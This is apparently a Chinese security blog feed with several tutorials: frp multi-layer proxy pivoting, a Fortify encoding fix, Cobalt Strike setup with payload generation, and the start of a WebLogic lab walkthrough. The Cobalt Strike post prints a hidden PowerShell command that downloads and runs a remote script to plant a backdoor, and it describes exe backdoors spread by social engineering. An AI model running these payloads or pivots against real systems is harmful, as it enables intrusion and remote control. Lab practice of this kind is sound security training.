frps.ini</code></pre><p>Windows 后台运行</p><pre><code>start /b frps -c frps.ini</code></pre><p>这样即使CTRL +C也不会断开</p><p>Linux 后台运行</p><pre><code>nohup ./frps -c ./frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</code></pre><p>停止：</p><p>先找到pid进程</p><ul><li>ps -aux|grep frp| grep -v grep</li></ul><p>例如找到进程为 6666</p><ul><li>kill -9 6666</li></ul><h3 id="PC1-启动-frpc"><a href="#PC1-启动-frpc" class="headerlink" title="PC1 启动 frpc"></a>PC1 启动 frpc</h3><p>frpc.ini</p><pre><code>[common]server_addr = 192.168.112.128server_port = 7000[http_proxy]type = tcpremote_port = 7777plugin = socks5local_ip = 192.168.52.20local_port = 7777</code></pre><p>启动命令</p><pre><code>frpc -c frpc.ini</code></pre><h3 id="修改-etc-proxychains4-conf"><a href="#修改-etc-proxychains4-conf" class="headerlink" title="修改 etc&#x2F;proxychains4.conf"></a>修改 etc&#x2F;proxychains4.conf</h3><pre><code>vi /etc/proxychains4.conf</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/46dac6751c90b9be332ed5eb0477f33e.png"></p><p>proxyfier如图所示</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b4b20807b401fa443a87a15ceede3b25.png"></p><p>此时我们可以访问192.168.52.0这个网段</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/bd5579ed616ee464f28fa771f923cee7.png"></p><p>我们想访问192.168.54.0此时需要搭建第二层隧道</p><h2 id="第二层隧道"><a href="#第二层隧道" class="headerlink" title="第二层隧道"></a>第二层隧道</h2><p>此时PC1既是客户端又是服务端</p><p>我们在PC1增加一个服务端</p><h3 id="PC1启动frps"><a href="#PC1启动frps" class="headerlink" title="PC1启动frps"></a>PC1启动frps</h3><p>frps.ini</p><pre><code>[common]bind_addr = 192.168.52.20bind_port = 7000</code></pre><h3 id="PC2启动frpc"><a href="#PC2启动frpc" class="headerlink" title="PC2启动frpc"></a>PC2启动frpc</h3><p>frpc.ini</p><pre><code>[common]server_addr = 192.168.52.20server_port = 7000[http_proxy]type = tcpremote_port = 7777plugin = socks5local_ip = 192.168.54.40local_port = 7777</code></pre><p>在 etc&#x2F;proxychains4.conf 新增第二层代理</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/74dbf6f62aa43497fe5cf466986efee4.png"></p><p>此时我们可以访问192.168.54.0这个网段了</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/120d404127c8f0b785618476ed0b9ce7.png"></p><h3 id="多层代理下Proxifier如何设置？"><a href="#多层代理下Proxifier如何设置？" class="headerlink" title="多层代理下Proxifier如何设置？"></a>多层代理下Proxifier如何设置？</h3><p>再增加一个代理，这里是设置的第二层代理</p><p>点击Proxychains 右边create将代理链按顺序从proxy servers里按住依次拖下，我这里起的名字代理链，都要拖在你起的这个名字（我这里是代理链）里，注意在同一级，如图所示</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/963b46504aaa7609f28b235de241daf0.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/cd8a03877b734ef9acb954faafb52fb9.png"></p><p>点击左下角add</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/9a89103fcf480552501e1a89fcd757df.png"></p><p>配置如下 添加通向网段</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5d9900d18e2d3615e7fefb18bf8c90a1.png"></p><p>成功访问54网段</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://i-blog.csdnimg.cn/blog_migrate/9e651a5411c60393942f27481a9a81de.png"></h2><h2 id="第三层隧道"><a href="#第三层隧道" class="headerlink" title="第三层隧道"></a>第三层隧道</h2><h3 id="PC2-启动frps"><a href="#PC2-启动frps" class="headerlink" title="PC2 启动frps"></a>PC2 启动frps</h3><p>原先PC2的frpc.ini无需变动</p><p>frps.ini</p><pre><code>[common]bind_addr = 192.168.54.40bind_port = 7000</code></pre><h3 id="pc3启动frpc"><a href="#pc3启动frpc" class="headerlink" title="pc3启动frpc"></a>pc3启动frpc</h3><p>frpc.ini</p><pre><code>[common]server_addr = 192.168.54.40server_port = 7000[http_proxy]type = tcpremote_port = 7777plugin = socks5local_ip = 192.168.93.60local_port = 7777</code></pre><h4 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://i-blog.csdnimg.cn/blog_migrate/6a911e400bf11a742efae108f997508f.png"></h4><p><img src="https://i-blog.csdnimg.cn/blog_migrate/64fb257320865444b9a72f8fc2c69ec2.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d39952948cc1b5c0e6d64a13dad50c7a.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/13355150a401313822263135393a5dd5.png"></p><p>可以访问93这个网段了</p><p>访问下PC4</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/47d78825b5b72afea3989e643761500d.png"></p><p>按照这种方式不断搭建隧道，无论多少层我们都能访问</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/Fortify%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81_Audit_Workbench/"/>
      <url>/2025/07/15/Fortify%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81_Audit_Workbench/</url>
      
        <content type="html"><![CDATA[<h1 id="Fortify中文乱码-Audit-Workbench"><a href="#Fortify中文乱码-Audit-Workbench" class="headerlink" title="Fortify中文乱码 Audit Workbench"></a>Fortify中文乱码 Audit Workbench</h1><h3 id="乱码现象原因"><a href="#乱码现象原因" class="headerlink" title="乱码现象原因"></a>乱码现象原因</h3><p>由于Audit Workbench使用的eclipse默认编码为GBK，导致在其中查看以UTF-8编码的文件出现乱码问题。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2765459145f85f0c84357e21efef63db.png" alt="在这里插入图片描述"></p><h3 id="单文件乱码解决方法"><a href="#单文件乱码解决方法" class="headerlink" title="单文件乱码解决方法"></a>单文件乱码解决方法</h3><p>可通过Edit下Set Encoding设置。需要光标在右侧代码框内。用于设置单个文件的编码方式<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b12cdf03d452c9d28a63bfbfb7421ae6.png" alt="在这里插入图片描述"></p><h3 id="修改Audit-Workbench默认编码"><a href="#修改Audit-Workbench默认编码" class="headerlink" title="修改Audit Workbench默认编码"></a>修改Audit Workbench默认编码</h3><p>找到<code>productlaunch.cmd</code>文件（<code>C:\Program Files\Fortify\Fortify_SCA_and_Apps_18.20\Core\private-bin\awb\productlaunch.cmd</code>）在最后这一行末添加<code>-Dfile.encoding=utf-8</code>，以规定其eclipse.exe默认使用utf-8编码。<br>修改前</p><pre><code>start &quot;%FORTIFY_CORE%&quot; /B /MIN &quot;%FORTIFY_CORE%\private-bin\awb\eclipse\eclipse.exe&quot; -vm &quot;%JAVA_CMD%&quot; -startup &quot;%FORTIFY_CORE%\lib\awb-startup-18.20.1071.jar&quot; -os win32 -ws win32 -arch x86_64 %USER_OPTS% %AWB_ARGS% -vmargs -Xmx2G -XX:-UseCompressedOops %AWB_VM_OPTS% %USER_VM_OPTS% -Dcom.fortify.InstallRoot=&quot;%FORTIFY_HOME%&quot; &gt;NUL</code></pre><p>修改后</p><pre><code>start &quot;%FORTIFY_CORE%&quot; /B /MIN &quot;%FORTIFY_CORE%\private-bin\awb\eclipse\eclipse.exe&quot; -vm &quot;%JAVA_CMD%&quot; -startup &quot;%FORTIFY_CORE%\lib\awb-startup-18.20.1071.jar&quot; -os win32 -ws win32 -arch x86_64 %USER_OPTS% %AWB_ARGS% -vmargs -Xmx2G -XX:-UseCompressedOops %AWB_VM_OPTS% %USER_VM_OPTS% -Dcom.fortify.InstallRoot=&quot;%FORTIFY_HOME%&quot; -Dfile.encoding=utf-8 &gt;NUL</code></pre><p>备注：<code>productlaunch.cmd</code>在<code>Audit Workbench</code>的 <code>auditworkbench.cmd</code>文件内可找到。<br>然后启动Audit Workbench，打开fpr文件查看文件内容。乱码解决<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bf82a3556568e80e89ff1400a2d2276a.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/Cobalt_Strike%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
      <url>/2025/07/15/Cobalt_Strike%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobalt-Strike工具安装与基础使用"><a href="#Cobalt-Strike工具安装与基础使用" class="headerlink" title="Cobalt Strike工具安装与基础使用"></a>Cobalt Strike工具安装与基础使用</h1><h4 id="Cobalt-Strike工具安装与基础使用-1"><a href="#Cobalt-Strike工具安装与基础使用-1" class="headerlink" title="Cobalt Strike工具安装与基础使用"></a>Cobalt Strike工具安装与基础使用</h4><ul><li>1.Cobalt Strike简介与下载</li><li><pre><code>* 1.1.Cobalt Strike介绍</code></pre><ul><li>1.2.下载Cobalt Strike</li></ul></li><li>2.Cobalt Strike安装</li><li><pre><code>* 2.1.安装Cobalt Strike</code></pre><ul><li><pre><code>  * 2.1.1.安装Java运行环境</code></pre><ul><li>2.1.2.服务端</li><li><pre><code>    * 2.1.2.1.解压至kail</code></pre><ul><li>2.1.2.2.给予权限</li><li>2.1.2.3.运行服务端</li></ul></li><li>2.1.3.客户端</li><li><pre><code>    * 2.1.3.1.初始化配置</code></pre><ul><li>2.1.3.2.指纹校验</li><li>2.1.3.3.成功运行</li></ul></li></ul></li></ul></li><li>3.Cobalt Strike基础使用</li><li><pre><code>* 3.1.监听</code></pre><ul><li><pre><code>  * 3.1.1.添加监听</code></pre><ul><li>3.1.2.设置监听</li></ul></li><li>3.2.生成payload</li><li><pre><code>  * 3.2.1.生成http的payload</code></pre><ul><li>3.2.2.设置监听</li><li>3.2.3.复制payload</li><li>3.2.4.访问URL</li><li>3.2.5.执行payload</li></ul></li><li>3.3.上线</li><li><pre><code>  * 3.3.1.测试</code></pre><ul><li>3.3.2.命令测试</li></ul></li><li>3.4.其它后门生成</li><li><pre><code>  * 3.4.1.下载.exe文件</code></pre><ul><li><pre><code>    * 3.4.1.1.生成payload</code></pre><ul><li>3.4.1.2.访问URL</li><li>3.4.1.3.上线</li></ul></li><li>3.4.2.生成.exe文件</li><li><pre><code>    * 3.4.2.1.生成文件</code></pre><ul><li>3.4.2.2.设置监听器</li><li>3.4.2.3.运行exe文件</li><li>3.4.2.4.上线</li></ul></li></ul></li><li>3.5.总结</li></ul></li></ul><h2 id="1-Cobalt-Strike简介与下载"><a href="#1-Cobalt-Strike简介与下载" class="headerlink" title="1.Cobalt Strike简介与下载"></a>1.Cobalt Strike简介与下载</h2><h3 id="1-1-Cobalt-Strike介绍"><a href="#1-1-Cobalt-Strike介绍" class="headerlink" title="1.1.Cobalt Strike介绍"></a>1.1.Cobalt Strike介绍</h3><p>Cobalt Strike是一款超级好用的渗透测试工具，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等多种功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受技术大佬的喜爱。<br>同时Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。<br>并且Cobalt Strike采用C&#x2F;S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透。</p><h3 id="1-2-下载Cobalt-Strike"><a href="#1-2-下载Cobalt-Strike" class="headerlink" title="1.2.下载Cobalt Strike"></a>1.2.下载Cobalt Strike</h3><p>这里可以通过官网下载或者使用我给的网盘进行下载，并且进行了汉化，当然汉化不保证完全汉化。<br>网盘中提供的是4.5版本的，不过在4.7版本以下的版本中存在XSS漏洞(CVE-2022-39197)，可被蓝队反攻，使用还需要注意。至于4.7版本也有但是没汉化，所以就没有提供。<br>官网：<a href="http://cobaltstrike.com/">官网</a><br>网盘：<a href="https://pan.baidu.com/s/1FwHL1Lsc_Qlhy6U_40LEwQ?pwd=bnft">网盘</a> 提取码：bnft</p><h2 id="2-Cobalt-Strike安装"><a href="#2-Cobalt-Strike安装" class="headerlink" title="2.Cobalt Strike安装"></a>2.Cobalt Strike安装</h2><h3 id="2-1-安装Cobalt-Strike"><a href="#2-1-安装Cobalt-Strike" class="headerlink" title="2.1.安装Cobalt Strike"></a>2.1.安装Cobalt Strike</h3><p>在安装Cobalt Strike的时候需要安装服务端以及客户端，并且服务端必须要安装在Linux系统下，而客户端就没那么多要求。<br>同时服务端和客户端都需要安装java运行环境，这里我使用kail来安装服务端，客户端安装在Windows操作系统上。</p><h4 id="2-1-1-安装Java运行环境"><a href="#2-1-1-安装Java运行环境" class="headerlink" title="2.1.1.安装Java运行环境"></a>2.1.1.安装Java运行环境</h4><p>启动Cobalt Strike需要JDK的支持，所以需要安装Java环境。想必之前在使用Burp Suite都应该安装过了，当然版本java版本至少要高于java11。<br>当然在如果服务端安装在kail中就无需安装java，在kail2022.4中自带java17。<br>这里我就不进行运行环境的安装了，百度搜索一大堆，什么？没装过Burp Suite，那你学Cobalt Strike干嘛？<br>不过这里需要注意如果之前安装过Burp Suite低版本使用的是java版本比较低，如果再安装java高版本就会导致Burp Suite无法使用，这里经过测试，可以先卸载低版本的java，然后安装高版本的，测试成功后，再安装低版本的java就可以了。</p><h4 id="2-1-2-服务端"><a href="#2-1-2-服务端" class="headerlink" title="2.1.2.服务端"></a>2.1.2.服务端</h4><p>如果你不想将Cobalt Strike安在kail中，想安装在其它的Linux系统中，那么自行搜索如何在Linux系统中安装java，也挺简单的。<br>服务端与客户端公用一个包，不需要考虑包到底是服务端的还是客户端的，其实主要是我一开始在考虑的问题，为什么提供的都是一个安装包，到底是服务端还是客户端，后来才明白是共用一个包。</p><h5 id="2-1-2-1-解压至kail"><a href="#2-1-2-1-解压至kail" class="headerlink" title="2.1.2.1.解压至kail"></a>2.1.2.1.解压至kail</h5><p>百度网盘中的压缩包解压发送到kail中。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3cac77fea8ca48830ccdb1d2991462e8.png" alt="在这里插入图片描述"></p><h5 id="2-1-2-2-给予权限"><a href="#2-1-2-2-给予权限" class="headerlink" title="2.1.2.2.给予权限"></a>2.1.2.2.给予权限</h5><p>这里需要给予teamserver文件的权限，这里只需要给予teamserver文件执行权限即可。</p><pre><code>命令：chmod +x teamserver </code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/e8188cf233b1f7d2a2cfbc953f639404.png" alt="在这里插入图片描述"></p><h5 id="2-1-2-3-运行服务端"><a href="#2-1-2-3-运行服务端" class="headerlink" title="2.1.2.3.运行服务端"></a>2.1.2.3.运行服务端</h5><p>这里运行服务器，需要执行.&#x2F;teamserver IP地址 密码，需要注意的是这个IP地址需要是真实的IP地址，不能是0.0.0.0或者127.0.0.1这些。密码是团队服务器的密码。这里是采用的是虚拟机所以IP地址是192段的。正常情况下最好能够购买一台公网服务器来搭建。</p><pre><code>命令：./teamserver 192.168.10.20 123456</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/ccd76f643bc948975ae70d41d70d32bb.png" alt="在这里插入图片描述"></p><h4 id="2-1-3-客户端"><a href="#2-1-3-客户端" class="headerlink" title="2.1.3.客户端"></a>2.1.3.客户端</h4><p>客户端这里只需要运行压缩包中的cobaltstrike.exe即可。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a16aec54dd27f35ecb3eed8f1d78d2f4.png" alt="在这里插入图片描述"></p><h5 id="2-1-3-1-初始化配置"><a href="#2-1-3-1-初始化配置" class="headerlink" title="2.1.3.1.初始化配置"></a>2.1.3.1.初始化配置</h5><p>在弹出的窗口中需要填写主机地址以及密码，这些都是需要和刚刚服务端上设置的一样。至于端口，默认就是50050无需修改，而用户这里可以自己随便设置一个即可，然后就可以连接了。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e50ae1fee54ec4645a3fbfeaf330cd29.png" alt="在这里插入图片描述"></p><h5 id="2-1-3-2-指纹校验"><a href="#2-1-3-2-指纹校验" class="headerlink" title="2.1.3.2.指纹校验"></a>2.1.3.2.指纹校验</h5><p>这里我由于连接过，就没有弹出指纹校验，这里我从网上找了一张图片，这里会含有一个SHA256哈希值，主要是防篡改，每一次的创建Cobalt Strike服务端生成的指纹都是不同的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7c8cff4fa67957adeeecda14d5c90be5.png" alt="在这里插入图片描述"></p><h5 id="2-1-3-3-成功运行"><a href="#2-1-3-3-成功运行" class="headerlink" title="2.1.3.3.成功运行"></a>2.1.3.3.成功运行</h5><p>当出现这个界面的时候就证明成功运行了。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b436c8e3fd14f46ce1238e478c79c13f.png" alt="在这里插入图片描述"></p><h2 id="3-Cobalt-Strike基础使用"><a href="#3-Cobalt-Strike基础使用" class="headerlink" title="3.Cobalt Strike基础使用"></a>3.Cobalt Strike基础使用</h2><h3 id="3-1-监听"><a href="#3-1-监听" class="headerlink" title="3.1.监听"></a>3.1.监听</h3><p>这里的监听的作用就是当生成的payload上线后能够监听到。</p><h4 id="3-1-1-添加监听"><a href="#3-1-1-添加监听" class="headerlink" title="3.1.1.添加监听"></a>3.1.1.添加监听</h4><p>中文这里我就不说了，用原版介绍吧，在菜单栏中的Cobalt Strike进入Listeners面板，然后点击下面的add，进行添加监听。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b75fb1524595a0af31f76e9eef1bc887.png" alt="在这里插入图片描述"><img src="https://i-blog.csdnimg.cn/blog_migrate/98b5a470d96174a0bf90090b2f646bbf.png" alt="在这里插入图片描述"></p><h4 id="3-1-2-设置监听"><a href="#3-1-2-设置监听" class="headerlink" title="3.1.2.设置监听"></a>3.1.2.设置监听</h4><p>输人名称、监听器类型、团队服务器IP地址、监听的端口，然后单击“Save”按钮保存设置。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7e29a07ab487e8ace4c5e9d22065b3d4.png" alt="在这里插入图片描述"></p><h3 id="3-2-生成payload"><a href="#3-2-生成payload" class="headerlink" title="3.2.生成payload"></a>3.2.生成payload</h3><h4 id="3-2-1-生成http的payload"><a href="#3-2-1-生成http的payload" class="headerlink" title="3.2.1.生成http的payload"></a>3.2.1.生成http的payload</h4><p>选择Attacks菜单，然后选择Web Drive-by再选择Scripted Web Delivery选项。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/84846762954feb4ce9d6e58502ec6625.png" alt="在这里插入图片描述"></p><h4 id="3-2-2-设置监听"><a href="#3-2-2-设置监听" class="headerlink" title="3.2.2.设置监听"></a>3.2.2.设置监听</h4><p>这里需要设置相应的监听，当设置完后就可以点击运行了。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4edef45f50ff0a0d19bc0a4fb47b8cbd.png" alt="在这里插入图片描述"></p><h4 id="3-2-3-复制payload"><a href="#3-2-3-复制payload" class="headerlink" title="3.2.3.复制payload"></a>3.2.3.复制payload</h4><p>在点击运行后会弹出一个窗口，这里需要将Cobalt Strike生成的Payload需要完整地复制下来，其中url它是个文件路径，就是让目标 （受害者）通过这个地址和端口下载 恶意脚本。</p><pre><code>命令：powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.10.20:80/a&#39;))&quot;</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/657701c75155209bc07647f3eb1f9ec6.png" alt="在这里插入图片描述"></p><h4 id="3-2-4-访问URL"><a href="#3-2-4-访问URL" class="headerlink" title="3.2.4.访问URL"></a>3.2.4.访问URL</h4><p>这里使用受害者的主机访问这个URL，这里我使用虚拟机进行测试，其实访问后就是一段powershell代码。</p><pre><code>URL：http://192.168.10.20/a</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/2420f4ff64c264ce04e6c2f2694df54c.png" alt="在这里插入图片描述"></p><h4 id="3-2-5-执行payload"><a href="#3-2-5-执行payload" class="headerlink" title="3.2.5.执行payload"></a>3.2.5.执行payload</h4><p>在目标主机上执行payload，这里我的理解是使用命令让其读取URL中代码进行后门植入。<br>执行的命令就是刚刚弹出提示的命令。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82bb9840d476457f5e327ce70de358f8.png" alt="在这里插入图片描述"></p><h3 id="3-3-上线"><a href="#3-3-上线" class="headerlink" title="3.3.上线"></a>3.3.上线</h3><p>执行完就可以在页面中看到一台机器上线了。在页面中能够显示，外网IP、内网IP、监听器、用户名、机器名、是否有特权、Beacon进程的PID、心跳时间等信息。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a385ed179ffde1dbf802aa3339612b2d.png" alt="在这里插入图片描述"></p><h4 id="3-3-1-测试"><a href="#3-3-1-测试" class="headerlink" title="3.3.1.测试"></a>3.3.1.测试</h4><p>这里可以对目标主机进行右击执行一些快捷操作，例如点击Interact，执行一些命令。注意执行命令的格式是shell 命令。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bf294af4f3b5ecd53d34a86aa824605f.png" alt="在这里插入图片描述"></p><h4 id="3-3-2-命令测试"><a href="#3-3-2-命令测试" class="headerlink" title="3.3.2.命令测试"></a>3.3.2.命令测试</h4><p>这里我就查询一下当前用户。这里需要注意的是Beacon的每次回连时间默认为60秒。回连后，执行命令的任务将被下发，并成功回显命令的执行结果，也就是说命令正常需要一段时间的显示，不会立即显示出来。</p><pre><code>命令：shell whoami</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1f2e8305de78834a8707665bb800511e.png" alt="在这里插入图片描述"></p><h3 id="3-4-其它后门生成"><a href="#3-4-其它后门生成" class="headerlink" title="3.4.其它后门生成"></a>3.4.其它后门生成</h3><p>当然这里也可以生成一些.exe文件，放入对方服务器中进行运行。这里我进行简单的演示。</p><h4 id="3-4-1-下载-exe文件"><a href="#3-4-1-下载-exe文件" class="headerlink" title="3.4.1.下载.exe文件"></a>3.4.1.下载.exe文件</h4><p>这里可以设置一个访问URL就会在目标主机上提示下载文件，下载后就会运行。</p><h5 id="3-4-1-1-生成payload"><a href="#3-4-1-1-生成payload" class="headerlink" title="3.4.1.1.生成payload"></a>3.4.1.1.生成payload</h5><p>还是点击刚刚那个位置，把类型调整为exe即可，监听器还是设置成刚刚那个监听器即可。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/44a1c130b7878152ead180a52ec5f250.png" alt="在这里插入图片描述"></p><h5 id="3-4-1-2-访问URL"><a href="#3-4-1-2-访问URL" class="headerlink" title="3.4.1.2.访问URL"></a>3.4.1.2.访问URL</h5><p>这里我由于生成过了，产生的URL是http:192.168.10.20&#x2F;a.exe。如果刚生成只是需要将弹出中的URL复制出来，让目标机访问下载即可。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a8daecebbeeb2d8be6d77262591601fa.png" alt="在这里插入图片描述"></p><h5 id="3-4-1-3-上线"><a href="#3-4-1-3-上线" class="headerlink" title="3.4.1.3.上线"></a>3.4.1.3.上线</h5><p>同样运行完就会在界面中显示有一台主机上线。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5c5992c365883a4501ac2c4c65c2bb28.png" alt="在这里插入图片描述"></p><h4 id="3-4-2-生成-exe文件"><a href="#3-4-2-生成-exe文件" class="headerlink" title="3.4.2.生成.exe文件"></a>3.4.2.生成.exe文件</h4><p>这里的.exe文件，就需要将这个后门发送给目标机上进行执行，这就需要社工了。</p><h5 id="3-4-2-1-生成文件"><a href="#3-4-2-1-生成文件" class="headerlink" title="3.4.2.1.生成文件"></a>3.4.2.1.生成文件</h5><p>这里的生成路径就不一样了，看我指的对方，忘记英文了。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/776cddcba1220e96a6b9d5324759ef8d.png" alt="在这里插入图片描述"></p><h5 id="3-4-2-2-设置监听器"><a href="#3-4-2-2-设置监听器" class="headerlink" title="3.4.2.2.设置监听器"></a>3.4.2.2.设置监听器</h5><p>这里的监听器还是刚刚那个监听器。点击生成后会让你选择一个路径进行保存，这里我也生成过了，我就不在生成了。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2ce6b9ba8d19bb988cfb3bb9b78eeffc.png" alt="在这里插入图片描述"></p><h5 id="3-4-2-3-运行exe文件"><a href="#3-4-2-3-运行exe文件" class="headerlink" title="3.4.2.3.运行exe文件"></a>3.4.2.3.运行exe文件</h5><p>这里需要在目标机上运行文件，至于文件名称，好像是随机的，当然你也可以修改。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f1227161fea41865b69805735c258a90.png" alt="在这里插入图片描述"></p><h5 id="3-4-2-4-上线"><a href="#3-4-2-4-上线" class="headerlink" title="3.4.2.4.上线"></a>3.4.2.4.上线</h5><p>同样这里运行完后，也会在界面中显示一台主机上线。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3ec29a87c25bd4bf0f5b110dac0670c1.png" alt="在这里插入图片描述"></p><h3 id="3-5-总结"><a href="#3-5-总结" class="headerlink" title="3.5.总结"></a>3.5.总结</h3><p>这里就是介绍一些简单的使用，后续将会出一篇更详细的使用教程。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/ATT_CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C_%E8%83%8E%E5%84%BF%E6%95%99%E5%AD%A6__1/"/>
      <url>/2025/07/15/ATT_CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C_%E8%83%8E%E5%84%BF%E6%95%99%E5%AD%A6__1/</url>
      
        <content type="html"><![CDATA[<h1 id="ATT-CK红队评估实战靶场二【胎儿教学】"><a href="#ATT-CK红队评估实战靶场二【胎儿教学】" class="headerlink" title="ATT&amp;CK红队评估实战靶场二【胎儿教学】"></a>ATT&amp;CK红队评估实战靶场二【胎儿教学】</h1><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6159ed73431fa89b2490280e68cddac2.jpeg"></p><p>给大家一个小建议，先打靶场练练手，再实战找目标打，因为实战是要快速完成的。我这里就是个例子，之前知道个大概，比较生手，一边打别人一边记录，打到一半别人就把网页关了。只能说太菜太慢。[手动狗头]</p><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><pre><code>下载地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</code></pre><p>直接点击下载</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/a9f1eebe6c8cc0bf4357b5dd34a685fe.png"></p><p>新增VMnet2网卡</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/569ff32247fd18414357c2dc5763c812.png"></p><p><strong>web：</strong> 需要配置两张网卡，分别是外网出访NAT模式和内网域环境仅主机模式下的VMnet2网卡。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/df5a8bdc4ff9f0b08b9dc3ffdbe1e3d7.png"></p><p><strong>PC：</strong> 跟web一样，也是需要配置两张网卡，分别是外网出访NAT模式和内网域环境仅主机模式下的VMnet2网卡。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/c3607b94eba6691a8322939194afde53.png"></p><p><strong>DC：</strong> 只是内网网段，所以只需配置仅主机模式</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/a213b7ee7a280f98b39345377d0e3d3f.png"></p><p>靶场的web和pc网关是192.168.111.1，我自己的网关设置是192.168.111.2，需要把外网nat网关改为.2。</p><p>账号：administrator</p><p>密码：1qaz@WSX</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/3d19c6e2fa3970c500a8f563e0cf93a4.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7fd589df9429b494edf42202b6182b68.png"></p><p>在web服务器上启动weblogic服务，用管理员权限administrator&#x2F;1qaz@WSX打开startweblogic。</p><p>路径C:\Oracle\Middleware\user_projects\domains\base_domain\bin</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/90e3edcadc2e3d00e3835ac594b9b279.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b0e315af381edcedccf9c80ed315ca17.png"></p><p>浏览器访问<a href="http://192.168.111.80:7001，看到Error">http://192.168.111.80:7001，看到Error</a> 404即启动成功，靶场搭建完成。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/51b31910603b5bc7867044b3bff89655.png"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h3><p>看到7001端口，或者探测出来这个端口，有可能存在weblogic漏洞，那么直接上工具。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/bd231a2f5024a81e1e65798de826d0be.png"></p><p>使用工具探测出存在反序列化漏洞 </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6a8f1b993ea743d3c06cfd246be5b2b1.png"></p><p>推荐一款可以注入weblogic内存马的工具，因为是注入到中间件的内存中，当访问到该url就会触发内存马，链接webshell，隐蔽性较好。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/ac0673a62f8b55f9a950e7877e50c1c8.png"></p><p>使用冰歇成功连接 </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d0b034c9e321995782ac09a6d0a96fc5.png"> 好了，那么外网打点已经成功啦，接下就是针对内网的信息收集与横向移动</p><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" 